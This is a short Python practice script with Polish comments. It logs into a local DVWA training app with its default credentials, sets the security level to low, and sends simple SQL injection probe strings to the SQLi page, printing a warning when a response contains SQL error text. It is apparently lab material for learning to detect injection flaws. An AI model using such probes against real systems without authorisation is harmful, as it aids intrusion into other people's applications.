import requests

s = requests.Session()

# login
s.post("http://localhost/DVWA/login.php", data={
    "username": "admin",
    "password": "password",
    "Login": "Login"
})

# ustaw security LOW (mega ważne)
s.get("http://localhost/DVWA/security.php?security=low&seclev_submit=Submit")

url = "http://localhost/DVWA/vulnerabilities/sqli/"

payloads = ["1", "'", '"', "--", "'("]

for payload in payloads:

    r = s.get(url, params={"id": payload})

    print("\nPayload:", payload)
    print("Status:", r.status_code)

    if "sql" in r.text.lower() or "mysql" in r.text.lower():
        print("[!] możliwy SQL error")